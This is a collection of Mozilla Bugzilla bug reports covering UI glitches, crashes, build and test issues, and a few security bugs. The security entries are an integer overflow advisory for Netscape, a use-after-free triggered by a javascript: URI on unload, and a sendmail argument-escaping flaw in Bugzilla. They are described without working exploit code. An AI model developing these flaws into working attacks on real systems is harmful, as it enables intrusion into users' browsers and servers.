20055,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.6+) Gecko/20011203 BuildID:    2001120308  On the 'File' menu in this build, the 'Close' and 'Exit' menu items are blank areas. The 'Redo' item under the 'Edit' menu is also blank. Clicking on them will close/exit the browser correctly, but there is no text there.  Reproducible: Always Steps to Reproduce: 1.Open Browser 2.Pull down 'file' menu 3.Look ;)",Close Exit and Redo menu items are blank
20123,"Mo, OS X, 0.9.5 Build 2001101516  1) Launch mo. 2) Go to any site with large forms (slashdot.org, bugzilla.mozilla.org). 3) Click to submit any post. 4) Type enough lines to get a slidebar (type until the first line scrolls off the top of thee screen. 5) Move cursor up a few lines. 6) Down arrow to the bottom of the submission. Hit right arrow.7) Cursor will go to beginning of document.  Not really a big deal, but irritating if you post frequently to Slashdot or on bugzilla.",Down arrow in multi-line field on form moves cursor to beginning of field
20135,"From Bugzilla Helper: User-Agent: Mozilla/4.78 [de]C-CCK-MCD DT  (Win98; U) BuildID:    2001122106  Mozilla detects screen properties (width, availWidth, colorDepth etc.) on  startup only. When I change these properties while Mozilla is running it does  not reflect that.    Reproducible: Always",Screen properties not updated
20137,"I'm not sure why this doesn't work, but run the attached code under Netscape 4.x and observe! And move your mouse around a bit.","[LAYER]JavaScript clock doesn't run, but maybe should"
20300,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.5) Gecko/20030918 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.5) Gecko/20030918  When I try to send a document in Openoffice as email through mozilla, composer opens up but the file does not appear in attachment. Also happens when I try option to convert to PDF and send as email.  Configuration in Openoffice to send emails is mozilla -composer. I cannot find information on how to embed the document attached in composer.  Can you provide some thoughts into this? Is this a limitation of the integration between both suites?  Reproducible: Always  Steps to Reproduce:",Attachment does not appear in composer when select Send Document as Email in Openoffice 1.1
20342,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Build Identifier: 3.2.2   After a crash which happened when I was sorting in the Bookmark Manager, all of my top-level bookmark folders beginning with the letters Q to Z are no longer present.    Reproducibility   Happens every time. Happens sometimes, but not always. Haven't tried to reproduce it. Tried, but couldn't reproduce it.     Reproducible: Couldn't Reproduce  Steps to Reproduce: 1.sdftsdgf 2.sdfgsdf 3.sdfghtyhjuyhj Actual Results:   hvsd,jdsvhb  Expected Results:   sdnfgjsdhfsdnvg dfvgnjdklf",crash if I close the mail window while checking for new POP mail
20462,Phoenix 0.4 as well as Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021015  The 'find what' field should get KB focus when a user type 'ctrl-f'.   Currently one has to type ctrl-f then click the popup to give focus.,find in page dialogue doesn't get KB focus
20480,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; pt-BR; rv:1.7.5) Gecko/20041118 Firefox/1.0 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; pt-BR; rv:1.7.5) Gecko/20041118 Firefox/1.0  In some pages/sites there is a problem with some characters as é á ã etc, the browser puts a interrogation point in the local of character.  Reproducible: Always",acentuation failure when displaying the page
20523,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.7+) Gecko/20020124 BuildID:    2002012403  User can see content of password and hidden fields in page info - it's great! But there should be ability (some users share computer and Mozilla with others) to turn this option off or to require special password for this option. Something like ""Show value of the password fields in Page Info: freely/require password [change password]/off"".  If you will decide that this is not critical, I will agree with you.  I think, an option to see value of hidden and password fields is very useful, so thank you!","User can see content of password and hidden fields in page info, and this option cannot be turned off"
20531,"Using the URL tests provided in the URL field above, I noticed a new behavior in 1.3a. I have not gone back to isolate the change, but I did a quick look in Chimera 0.6, and it behaves the ""correct"" way, which is: ""http://q""  STEPS: Mouseover a relative URL ""//g"" (see test case page)  OBSERVED:  See the absolute URL ""http://g/"" in status field, which is not the correct answer.  EXPECTED: The stest suite says the mouseover should show ""http://g""  --- NOTE: I don't think this is a severe regression since most URL schemes do need a ""/"" after the hostip section.","URL: ""//g"" -> ""http://g/"""
20556,STR 1. Drag a link over Bookmarks Widget 2-a. Drop the link on Bookmarks Widget 2-b. Press ESC to cancel D&D 2-c. Drop the link on out side of Bookmarks Widget 3. Open Bookmarks Widget  Actual Results: Drop indicator stays  Expected Results: Drop indicator should vanish,Drop indicator of new Bookmarks Widget stays forever
20624,"Current description is { Problems with posting to or reading newsgroups, adding news servers. If you are having problems adding a newsgroup or a news server, you should choose the ""Subscribe"" component from the list. }  But there is no 'Subscribe' component in 'MailNews Core'.",[MailNews Core] Update 'Networking: News' component description
20657,"Bug 471317 comment 10: { > While there, the box names on that page should be unified too: > after either '* comm-central *' or '* comm-central mozilla-central *'.  TB/m-c '* bloat build' still have this issue.  And TB/1.9.1 has '* comm-1.9.1 check' [too soon !?] and '* comm-central *' on all others. }",Unify tinderbox names
20735,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win95; en-US; rv:0.8.1+) Gecko/20010426 BuildID:    2001042604  In the alternate 3-pane view (wide message frame, short folder frame), Modern theme, the vertical separator has no grippy.  The grippy is present in the standard (long folder frame) view.  i.e., the grippy is missing from the separator represented by the '!' in the diagram below:  --------------- I      !      I I-------------- I             I I             I ---------------   Reproducible: Always Steps to Reproduce: 1. open mail in the alternate 3-pane view 2. note missing grippy on vertical separator between the folder and message frames 3. compare to vertical separator in the standard 3-pane view  Actual Results:  Grippy is absent in modern theme, alternate 3-pane view.  Expected Results:  Grippy should be present.","In alternate 3-pane mail view, vertical separator missing the grippy"
20739,Created attachment 394499 the diff file  adding the word 'a' to change the sentence from:    ...provide you with full-featured and easy to use calendar application... to    ...provide you with a full-featured and easy to use calendar application...,Correcting grammar on Sunbird homepage
20825,"If you type @google (or part of it and let it autofill), the title of the heuristic result is ""— Search with Google"".  It shouldn't include the em dash.","When a search @alias is typed, the heuristic result title shouldn't include an em dash (""—"")"
20859,This bug is for crash report bp-79157f17-cb2a-4ac4-b402-2aa6b0200312.  ``` Top 10 frames of crashing thread:  0 libxul.so RustMozCrash mozglue/static/rust/wrappers.cpp:17 1 libxul.so mozglue_static::panic_hook mozglue/static/rust/lib.rs:89 2 libxul.so core::ops::function::Fn::call src/libcore/ops/function.rs:72 3 libxul.so std::panicking::rust_panic_with_hook src/libstd/panicking.rs:475 4 libxul.so rust_begin_unwind src/libstd/panicking.rs:375 5 libxul.so core::panicking::panic_fmt src/libcore/panicking.rs:84 6 libxul.so core::slice::slice_index_len_fail src/libcore/slice/mod.rs:2674 7 libxul.so neqo_transport::send_stream::TxBuffer::next_bytes  8 libxul.so neqo_transport::send_stream::SendStream::next_bytes  9 libxul.so neqo_transport::connection::Connection::output   ```,Crash in [@ core::slice::slice_index_len_fail]
20892,There's a bunch of stuff being built into mozglue blocklist code that shouldn't be there for builds that we ship.,Remove unnecessary blocklist hooks from TestDllBlocklist
20992,This is considerably more ergonomic.,Replace Maybe union in profiler IPDL with native Maybe support
21019,I'm seeing intermittent issues where uploading a file via drag&drop + formdata + xhr leads to the XHR showing up in the devtools but not starting. Using the <input type=file> of the page and opening the file via the file browser is more reliable.,Drag&Drop of files onto browser leads to stuck XHRs
21027,"after the update to firefox 65 there have been a handful of reports from users, who have set the preference ""Delete cookies and site data when Firefox is closed"" but have exceptions for sites they want to stay logged-into over multiple sessions, that firefox started clearing some cookies from domains that were set to ""allow"" after closing the app.  user astral on irc found out that's the case in particular when there are stricter permissions (""allow for session"") for a subdomain than for the top level domain (""allow"") - in this setup the cookies from the top level domain get cleared after the session as well.  str in a new profile: - tick ""Delete cookies and site data when Firefox is closed"" in about:preferences#privacy - under manage permissions set https://www.mozilla.org to ""Allow for Session"" and https://mozilla.org to ""Allow"" - visit https://www.mozilla.org - take a look under ""Manage Data"", there is now be a cookie present from www.mozilla.org as well as mozilla.org - restart the browser and take a look in ""Manage Data"" again - the cookie from mozilla.org is gone, though it should have been kept according to the settings.  this looks related to the work in bug 1503217...",subdomain settings override cookie permissions for domain when cleared on shutdown
21073,Follow up to bug 1515078 in order to be able to test the opt out UX. Currently pref value will not change as the way it is implemented checks that the user is enrolled.,Mock experiment enrollment via ASRouter debug
21391,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322) Build Identifier:   iDEFENSE Security Advisory xx.02.04:  I. BACKGROUND  Netscape SOAPParameter Constructor Integer Overflow Vulnerability   II. DESCRIPTION  Improper input validation to the SOAPParameter object constructor in Netscape  allows   execution of arbitrary code.  The SOAPParameter object's constructor contains an integer overflow which  allows   contollable heap corruption.  A webpage can be constructed to leverage this into remote execution of  arbitrary code.  III. ANALYSIS  Successful exploitation allows the remote attacker to execute abitrary code in  the   context of the user running the browser.  IV. DETECTION  Netscape version 7.0 and 7.1 have been confirmed to be vulnerable. Mozilla 1.6  is also   vulnerable to this issue. It is suspected that earlier versions of both  browsers may   also be vulnerable.  V. WORKAROUNDS  Disable Javascript in the browser.   VI. VENDOR RESPONSE   VII. CVE INFORMATION   VIII. DISCLOSURE TIMELINE    January 17, 2004      Exploit acquired by iDEFENSE.     IX. CREDIT  zen-parse (zen-parse at gmx.net) is credited with this discovery.  Reproducible: Always Steps to Reproduce: 1. 2. 3.",Netscape SOAPParameter Constructor Integer Overflow Vulnerability
21554,"Created attachment 257346 testcase - crashes on exit if page source is viewed  use after free with window.unload and javascript uri  window.onunload=...location.replace(""javascript:twisted"") causes use after on exit if source is viewed.  in ""view source"" there is some garbage in the beginning.  seems trunk only.  classified as use after because 0xdadadada is dereferenced and src/jsarena.h:170:#define JS_FREE_PATTERN         0xDA  WARNING: NS_ENSURE_TRUE(aParser) failed: file /opt/joro/firefox/mozilla/parser/htmlparser/src/nsDTDUtils.cpp, line 1062 ###!!! ASSERTION: More UnblockOnload() calls than BlockOnload() calls; dropping call: 'Not Reached', file /opt/joro/firefox/mozilla/content/base/src/nsDocument.cpp, line 5445 ###!!! ASSERTION: More UnblockOnload() calls than BlockOnload() calls; dropping call: 'Not Reached', file /opt/joro/firefox/mozilla/content/base/src/nsDocument.cpp, line 5445  #5  <signal handler called> #6  0xb7d6e3bd in NS_LogCOMPtrRelease_P (aCOMPtr=0x8260afc, aObject=0x81a81c8)     at /opt/joro/firefox/mozilla/xpcom/base/nsTraceRefcntImpl.cpp:1205 #7  0xb498a807 in ~nsCOMPtr (this=0x8260afc)     at ../../dist/include/xpcom/nsCOMPtr.h:581 #8  0xb4daad1a in ~MapItem (this=0x8260af8)     at /opt/joro/firefox/mozilla/content/xslt/src/base/txExpandedNameMap.h:129 #9  0xb4daad3d in nsTArrayElementTraits<txExpandedNameMap_base::MapItem>::Destruct (e=0x8260af8) at ../../../../dist/include/xpcom/nsTArray.h:198 #10 0xb4daad94 in nsTArray<txExpandedNameMap_base::MapItem>::DestructRange (     this=0x8260ae4, start=0, count=2)     at ../../../../dist/include/xpcom/nsTArray.h:699 #11 0xb4daae7a in nsTArray<txExpandedNameMap_base::MapItem>::RemoveElementsAt (     this=0x8260ae4, start=0, count=2)     at ../../../../dist/include/xpcom/nsTArray.h:550 #12 0xb4dd88b8 in nsTArray<txExpandedNameMap_base::MapItem>::Clear (  #6  0xb7d6e3bd in NS_LogCOMPtrRelease_P (aCOMPtr=0x8260afc, aObject=0x81a81c8)     at /opt/joro/firefox/mozilla/xpcom/base/nsTraceRefcntImpl.cpp:1205 1205      void *object = dynamic_cast<void *>(aObject); (gdb) p *aObject $1 = {_vptr.nsISupports = 0xdadadada}",[FIX]use after free with window.unload and javascript uri
21567,"Right now getAttribute and setAttribute are very general in terms of dealing with casing, prefixed attrs, etc.  But prefixes on attrs are rare and often enough people use the right case (in the upper/lower) anyway.  So it might make sense to fast-path at least the no-prefix case, and maybe the correct-case case too.","Fast-path attribute access for the case of no prefixes, and maybe correct cases"
21589,"See the attached testcase.  It should alert ""[object HTMLBodyElement]"", not undefined, and does in fx7.  This would be really easy to fix in the nodelist proxy code, except that the JS engined doesn't expose the APIs that do the right thing (that is, looking up the prop on the proto but using the proxy itself as |this|) to consumers.  I suspect we need to fix this for fx10....",Nodelist prototype property getters/setters are called with wrong |this|
21666,Part of the overall conversion to ReactJS.  Estimated difficulty of 2,Convert Keyboard Navigation to ReactJS
21712,Anthony says cpearce is already working on this.,"Decode unencrypted H.264 and AAC using Adobe's CDM on Windows (Vista, and K/N editions)"
21867,"Some of these buttons use padding, some use a px min-height. I think padding is preferable in order to adapt to different font sizes.",Consolidate panel footer button dimensions
21876,This is a flaw in search-one-offs.js that Jamie found in bug 1567384.,Setting SearchOneOffs::selectedButton = null shouldn't remove the input's aria-activedescendant attribute when it was pointing to an item that isn't a one off search button
21933,"Bug 816967 (remotable style editor) changed the API of StyleEditorPanel#selectStyleSheet, but didn't change the calls to it in the inspector. I am a little surprised that a test didn't catch this.","""Remotable Style Editor"" broke stylesheet links from the Inspector"
22016,"See bug 1613275 and bug 1607845. In bug 1607845, the aim was to regenerate all test certificates that would be expiring. Unfortunately, a few were missed:  * build/pgo/certs/ certificate DBs and mochitest.client are regenerated in a different way than the rest of the certificates in bug 1607845. These would probably best be addressed by formally documenting the process of re-generating all of the certificates. * security/manager/ssl/tests/unit/test_certDB_import/ certificates were missed by mistake. It's unclear how this happened. * security/manager/ssl/tests/unit/test_intermediate_preloads/ were missed because there is no `test_intermediate_preloads` entry in the `TEST_DIRS` section of security/manager/ssl/tests/unit/moz.build, which means that the build system never knew to re-generate those certificates, even after un-commenting-out security/manager/ssl/tests/unit/test_intermediate_preloads/moz.build * security/manager/ssl/tests/unit/test_missing_intermediate/missing-intermediate.der is DER, not PEM, and so we don't have a way to automatically re-generate it. However, it doesn't need to be DER.",test fixups to avoid skipping regenerating some expired certificates
22027,"Notes for a possible implementation  - use OAuth::Lite2 - add oauth.cgi endpoint that just wraps PSGI app https://metacpan.org/pod/OAuth::Lite2::Server::Endpoint::Token - Implement Bugzilla::OAuth::DataHandler as subclass of https://metacpan.org/pod/OAuth::Lite2::Server::DataHandler - Implement Bugzilla::OAuth::AuthInfo objects - Implement Bugzilla::OAuth::AccessToken, subclass of https://metacpan.org/pod/OAuth::Lite2::Model::AccessToken which will contain a Bugzilla::User::APIKey object. - Wrap (conditionally?) rest.cgi with Plack::Middleware::Auth::OAuth2::ProtectedResource and poke at auth code to use this for authentication (really, just adapting what an oauth-client will be sending to the API keys).  Not going to estimate this right now, it's a decent amount of work but not to the level that implementing our own crappy auth.cgi system.",Implement OAuth2 on BMO
22094,Most likely the easiest thing to do here is only allow http[s] for the custom tab and fire a VIEW intent for everything else.,Only open a custom tab for out-of-scope URLs if Gecko is going to show it
22119,Due 2020-02-13  pieces: - gzip decompress transform - payload format transform   - snake case   - `additional_properties` - use `OUTPUT_MODE=file_loads` mode with Pub/Sub load queue   - or update configuration for `OUTPUT_MODE=mixed` to correctly handle higher frequency of messages over 1MB decompressed.,Add payload output format support to ingestion-sink
22177,"jaws, any ideas for what would cause the missing ""nothing found"" -> ""Should be in search results"" failure in browser_search_within_preferences_1.js below? I.e., what would make it find nothing but fail to display the ""nothing found""?  Bug 1446186 and bug 1446392 were most likely caused by the export of bug 1404890 (attempted to land in m-c in 1446053).  In the export, we did fix up a test in browser_search_within_preferences_1.js by adding ""homeContentsGroup"" to the expected id visible list: https://hg.mozilla.org/mozilla-central/diff/b0af4c10b8bb/browser/components/preferences/in-content/tests/browser_search_within_preferences_1.js  Looks like browser_search_within_preferences_1.js has an intermittent test when it tries to search for ""coach"" expecting to find the ""nothing found"", but the screenshot from bug 1446186 shows nothing appears below the search header.  TEST-UNEXPECTED-FAIL | browser/components/preferences/in-content/tests/browser_search_within_preferences_1.js | Should be in search results -   Separately bug 1446392 has unexpected network to getpocket.cdn.mozilla.net from browser_privacypane_8/4.js that seems to match up with the href added for the sponsored learn more link: https://hg.mozilla.org/mozilla-central/diff/b0af4c10b8bb/browser/extensions/activity-stream/lib/AboutPreferences.jsm#l1.239  Although I thought sponsored shouldn't be set during these tests anyway, so maybe it's another link triggering it..",Fix AboutPreferences.jsm and/or preferences tests
22221,"I triggered this while browsing with a Firefox build built with: -fsanitize=nonnull-attribute  changeset: 397325:fe1794e607cc  /mozilla-central/security/nss/lib/ssl/sslencode.c:98:37: runtime error: null pointer passed as argument 2, which is declared to never be null /usr/include/string.h:43:28: note: nonnull attribute specified here     #0 0x7f94eb32170f in sslBuffer_AppendVariable /mozilla-central/security/nss/lib/ssl/sslencode.c:98:5     #1 0x7f94eb36b3d7 in tls13_HkdfExpandLabel /mozilla-central/security/nss/lib/ssl/tls13hkdf.c:189:10     #2 0x7f94eb34f209 in tls13_DeriveTrafficKeys /mozilla-central/security/nss/lib/ssl/tls13con.c:3170:10     #3 0x7f94eb34f209 in tls13_SetCipherSpec /mozilla-central/security/nss/lib/ssl/tls13con.c:3332     #4 0x7f94eb359ff7 in tls13_HandleServerHelloPart2 /mozilla-central/security/nss/lib/ssl/tls13con.c:2589:10     #5 0x7f94eb2ea66e in ssl3_HandleServerHello /mozilla-central/security/nss/lib/ssl/ssl3con.c:6390:14     #6 0x7f94eb2e54e9 in ssl3_HandleHandshakeMessage /mozilla-central/security/nss/lib/ssl/ssl3con.c:11330:18     #7 0x7f94eb2f75ab in ssl3_HandleHandshake /mozilla-central/security/nss/lib/ssl/ssl3con.c:11515:18     #8 0x7f94eb2f75ab in ssl3_HandleNonApplicationData /mozilla-central/security/nss/lib/ssl/ssl3con.c:12029     #9 0x7f94eb2f2e7d in ssl3_HandleRecord /mozilla-central/security/nss/lib/ssl/ssl3con.c:12300:12     #10 0x7f94eb31855b in ssl3_GatherCompleteHandshake /mozilla-central/security/nss/lib/ssl/ssl3gthr.c:504:22     #11 0x7f94eb32b0a9 in SSL_ForceHandshake /mozilla-central/security/nss/lib/ssl/sslsecur.c:399:24     #12 0x7f94cacbecc6 in nsNSSSocketInfo::DriveHandshake() /mozilla-central/security/manager/ssl/nsNSSIOLayer.cpp:423:18     #13 0x7f94bfc78aa7 in mozilla::net::nsHttpConnection::EnsureNPNComplete(nsresult&, unsigned int&) /mozilla-central/netwerk/protocol/http/nsHttpConnection.cpp:477:19     #14 0x7f94bfc7b3af in mozilla::net::nsHttpConnection::OnSocketWritable() /mozilla-central/netwerk/protocol/http/nsHttpConnection.cpp:1807:21     #15 0x7f94bfc7f58e in mozilla::net::nsHttpConnection::OnOutputStreamReady(nsIAsyncOutputStream*) /mozilla-central/netwerk/protocol/http/nsHttpConnection.cpp:2338:19     #16 0x7f94bfc8966c in non-virtual thunk to mozilla::net::nsHttpConnection::OnOutputStreamReady(nsIAsyncOutputStream*) /mozilla-central/netwerk/protocol/http/nsHttpConnection.cpp     #17 0x7f94bf1c50fa in mozilla::net::nsSocketOutputStream::OnSocketReady(nsresult) /mozilla-central/netwerk/base/nsSocketTransport2.cpp:563:19     #18 0x7f94bf1d05bd in mozilla::net::nsSocketTransport::OnSocketReady(PRFileDesc*, short) /mozilla-central/netwerk/base/nsSocketTransport2.cpp:2180:21     #19 0x7f94bf1e0835 in mozilla::net::nsSocketTransportService::DoPollIteration(mozilla::BaseTimeDuration<mozilla::TimeDurationValueCalculator>*) /mozilla-central/netwerk/base/nsSocketTransportService2.cpp:1151:29     #20 0x7f94bf1deea6 in mozilla::net::nsSocketTransportService::Run() /mozilla-central/netwerk/base/nsSocketTransportService2.cpp:921:13     #21 0x7f94bf1e13fc in non-virtual thunk to mozilla::net::nsSocketTransportService::Run() /mozilla-central/netwerk/base/nsSocketTransportService2.cpp     #22 0x7f94bef786bf in nsThread::ProcessNextEvent(bool, bool*) /mozilla-central/xpcom/threads/nsThread.cpp:1039:14     #23 0x7f94befabf70 in NS_ProcessNextEvent(nsIThread*, bool) /mozilla-central/xpcom/threads/nsThreadUtils.cpp:510:10     #24 0x7f94c01ca4d8 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /mozilla-central/ipc/glue/MessagePump.cpp:334:20     #25 0x7f94c0051109 in RunHandler /mozilla-central/ipc/chromium/src/base/message_loop.cc:319:3     #26 0x7f94c0051109 in MessageLoop::Run() /mozilla-central/ipc/chromium/src/base/message_loop.cc:299     #27 0x7f94bef730a8 in nsThread::ThreadFunc(void*) /mozilla-central/xpcom/threads/nsThread.cpp:423:11     #28 0x7f94ec37f84a in _pt_root /mozilla-central/nsprpub/pr/src/pthreads/ptthread.c:201:5     #29 0x7f94efc087fb in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x77fb)     #30 0x7f94eec36b0e in clone /build/glibc-CxtIbX/glibc-2.26/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:95","UBSan: null pointer passed as argument 2, which is declared to never be null [@ sslBuffer_AppendVariable]"
22232,See bug 1273303. Emilio is going to take this.,stylo: Avoid triggering restyle when a stylesheet is added that can't affect the document
22277,"The other day on IRC a contributor was concerned that the provision part of `vagrant up` hadn't completed successfully, since the log output contained warnings in red (due to being on stderr), and because our docs say:  > It is very important that the provisioning process complete successfully > before trying to interact with your test instance of treeherder: some things > might superficially seem to work a partially configured machine, but it is > almost guranteed that some things will break in hard-to-diagnose ways if > vagrant provision is not run to completion.  (The reason the docs say this is because in the past we had the opposite problem - contributors saying that they couldn't get Django/... working but it turned out they'd just ignored provision errors)  The log lines in question are:  """""" ==> default: -----> Running pip install ==> default: Ignoring aiohttp: markers 'python_version >= ""3""' don't match your environment ==> default: Ignoring yarl: markers 'python_version >= ""3""' don't match your environment ==> default: Ignoring multidict: markers 'python_version >= ""3""' don't match your environment ==> default: Ignoring async-timeout: markers 'python_version >= ""3""' don't match your environment """"""  ...and:  """""" ==> default:   Applying model.0001_squashed_0053_add_job_platform_option_push_index... ==> default: /home/vagrant/python/lib/python2.7/site-packages/django/db/backends/mysql/base.py:101: Warning: (124L, u'InnoDB rebuilding table to add column FTS_DOC_ID') ==> default:   return self.cursor.execute(query, args) """"""  We can either `grep -v '...'` or just redirect to stdout so they at least don't appear in the colour red in the console.",Suppress Vagrant provision log output that confuses contributors
22319,"Bug 1250782 introducing the device registration will land in Fx50, but bug 1287643 introducing push capabilities will land in Fx51. We have to bump the registration version in order to force devices to re-register themselves (and send the Push callback url to FxA).",Bump FXA device registration version
22472,"The goal is to address bug 756881 by allowing us to take snapshots of sites loaded without cookies (i.e. load the page with nsIRequest::LOAD_ANONYMOUS), and to eventually also potentially address bug 755996, by avoiding thumbnailing pages that contain e.g. filled in form data.  A nice side effect is that we may be able to have this process occur entirely off the main thread, such that the thumbnailing process in general does not cause main thread responsiveness issues.  Some initial thoughts about implementation details are at https://etherpad.mozilla.org/background-thumbnailing .",implement background service for page thumbnailing
22496,"NSS 3.4 has reimplemented CERT_FindCertIssuer().  The new version  incorrectly identifies some certs as self-signed that are not. The problem is actually in function nssCertificate_BuildChain.  A self signed cert should have issuer name identical to subject name AND either a) no authority key identifier extension, or b) an authority key identifier and a subject key identifier, both with  the same identifier value.    I believe that a cert with matching issuer and subject names, but whose  authotity key identifier does not match its subject key identifier should be treated as not self signed.    In function nssCertificate_BuildChain, the loop that finds the issuer begins with this while condition:     while (!nssItem_Equal(&c->subject, &c->issuer, &status)) { I believe that test is wrong, because it ignores the possibility that the cert ""c"" has an authority key identifier that does not match its subject key identifer.    I have found a case of a certificate chain that fails to verify because this code identifies a cert in the chain as self-signed, and that cert's signature is incorrect when verified using the public key in that same cert.",NSS 3.4+ misidentifies certs as self-signed
22498,"The “I'm added to or removed from this capacity” user pref doesn't work for new bugs, at least not for Assignee (didn't test for others). This affects at least 2.22 and tip. I suspect earlier releases to be affected, too.  Steps to reproduce: o Mangle a test user account userA:   - Switch off all mail notifications   - Switch on “I'm added to or removed from this capacity” for Assignee o Log on as somebody else (userB) o File a bug, assigning it to userA  Actual results: userA is not notified.  Expected results: userA is notified.","""I'm added to or removed from this capacity"" user pref doesn't work for new bugs"
22572,"With latest test build from 30-08-2017:  1. Visit https://demo.yubico.com/u2f 2. Insert two USB keys 3. Follow instructions to create account 4. Log in and touch token on prompt ** Note that token displays steady light instead of blinking light 5. Wait a few seconds 6. Attempt to interact with browser by refreshing page, etc. ** Note that browser is non-responsive. 7. Remove USB token that you interacted with and wait a few seconds, then reinsert.  Result:  Crash   Note that between steps 6 and 7, you may experience a crash at intermittent times, as the previous steps appear to make Firefox unstable. I have attempted to find a case that crashes consistently.  Also note that test sites using WebAuthN and multiple tokens don't appear to have this problem.",Crash when using two USB tokens on U2F test site
22575,"On Fennec builds from 17 May 2019 (and possibly earlier), we're getting an exception when trying to Make Credential from WebAuhthn:  ``` 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager: Couldn't run WebAuthnUtils 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager: java.lang.NoSuchMethodException: makeCredential [class java.lang.String, class org.mozilla.gecko.util.GeckoBundle, class [B, class [B, long, class java.lang.String, class [Lorg.mozilla.gecko.WebAuthnTokenManager$WebAuthnPublicCredential;, class org.mozilla.gecko.util.GeckoBundle, class org.mozilla.gecko.util.GeckoBundle, interface org.mozilla.gecko.WebAuthnTokenManager$WebAuthnMakeCredentialResponse] 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager:  at java.lang.Class.getMethod(Class.java:2068) 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager:  at java.lang.Class.getDeclaredMethod(Class.java:2047) 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager:  at org.mozilla.gecko.WebAuthnTokenManager.webAuthnMakeCredential(WebAuthnTokenManager.java:118) 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager:  at org.mozilla.gecko.mozglue.GeckoLoader.nativeRun(Native Method) 05-17 14:58:11.342 29599 29731 W WebAuthnTokenManager:  at org.mozilla.gecko.GeckoThread.run(GeckoThread.java:476) ```  The NoSuchMethodException happens after resolving the WebAuthnUtils class, so the class exists.   The method signature from above is: `makeCredential [class java.lang.String, class org.mozilla.gecko.util.GeckoBundle, class [B, class [B, long, class java.lang.String, class [Lorg.mozilla.gecko.WebAuthnTokenManager$WebAuthnPublicCredential;, class org.mozilla.gecko.util.GeckoBundle, class org.mozilla.gecko.util.GeckoBundle, interface org.mozilla.gecko.WebAuthnTokenManager$WebAuthnMakeCredentialResponse]`  The one from current m-c is: ```     public static void makeCredential(final String rpId, final GeckoBundle identifiers,                                       final byte[] userId, final byte[] challenge,                                       final long timeoutMs, final String originStr,                                       final WebAuthnTokenManager.WebAuthnPublicCredential[] excludeList,                                       final GeckoBundle authenticatorSelection,                                       final GeckoBundle extensions,                                       WebAuthnTokenManager.WebAuthnMakeCredentialResponse handler)``` ``` Careful inspection shows a match of function signatures.  The involved files are: https://hg.mozilla.org/mozilla-central/log/tip/mobile/android/geckoview/src/main/java/org/mozilla/gecko/WebAuthnTokenManager.java https://hg.mozilla.org/mozilla-central/log/tip/mobile/android/base/java/org/mozilla/gecko/util/WebAuthnUtils.java  There's nothing as of morning 17 May 2019 that should have impacted these two classes. (Note, there's a consolidation patch on inbound that affects the signatures). The only external non-primitive type in that signature is GeckoBundle, which similarly is without change:  https://hg.mozilla.org/mozilla-central/log/tip/mobile/android/geckoview/src/main/java/org/mozilla/gecko/util/GeckoBundle.java  This did work at the beginning of the week. It also works fine in local builds. So now the mystery is: Why all of a sudden is there a NoSuchMethodException?","NoSuchMethodException: {makeCredential, getAssertion} in WebAuthnUtils"
22623,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070508 (Debian-1.8.1.4-3) Galeon/2.0.2 (Debian package 2.0.2-4) Build Identifier: 3.0  email_reply.pl performs insufficient escaping of arguments passed to sh -c sendmail.  This might be remotely exploitable; setting security flag.  Long story: After some hours battling, I could get email_reply.pm to run, but when passed valid mail data, it would fail with: sh: -c: line 0: syntax error near unexpected token `newline' sh: -c: line 0: `/usr/lib/sendmail -t -oi -i -f<submit@bugzilla.example.com>'  The mail data looks something like: From lool@dooz.org Wed Jul  4 17:19:58 2007 Date: Wed, 4 Jul 2007 17:19:58 +0200 From: =?iso-8859-1?Q?Lo=EFc?= Minier <lool@dooz.org> To: submit@bugzilla.example.com Subject: Essai Message-ID: <20070704151958.GD9800@bee.dooz.org> MIME-Version: 1.0 Content-Type: text/plain; charset=iso-8859-1 Content-Disposition: inline Content-Transfer-Encoding: 8bit  Essai  --  Loïc Minier  I worked around this problem by adding single quotes to: push(@args, ""-f'$from'"") if $from; in Bugzilla/Mailer.pm, around line 80.  This is with version 2.181 of Email::Send as found in Debian stable (etch) in the libemail-send-perl package.  Note: email_reply.pl still fails for me afterwards with: sendmail: fatal: No recipient addresses found in message header There was an error sending mail from '<submit@bugzilla.bpl-group.org>'     to 'Loïc Minier <lool@dooz.org>':error when closing pipe to /usr/lib/sendmail:   Reproducible: Always",[SECURITY] Insufficient escaping of From address when using Sendmail
22670,"At least one user is having Persona Auth issues with AirMo.  Excerpt from email:     On 4/8/14, 5:21 PM, Gabriela Montagu wrote:       On 8 April 2014 20:59, William Reynolds <williamr@mozilla.com> wrote:           I think I briefly met you at MozCamp in Buenos Aires in 2011 :)      Could be.... I'm really sorry... I met so many new people there.... Do you remember if we had a chance to talk about something in particular or who introduced us if someone actually did?           I would be happy to help. Can you please try these steps?         - Visit https://air.mozilla.org/         - Use the Sign In button on the right and sign in using gmontagu@gmail.com         - Visit https://air.mozilla.org/town-hall-news-about-brendan/         - A video should appear on that page      Many thanks for trying to help me William!!      I tried all the steps but visiting the video site I get the same as usual:      Title: Town Hall - News About Brendan     This event is available only to Mozilla volunteers and staff       Many thanks     again     !     Best regards,     Gabriela     QA Mozilla Hispano",Persona Auth Failing for Mozillian
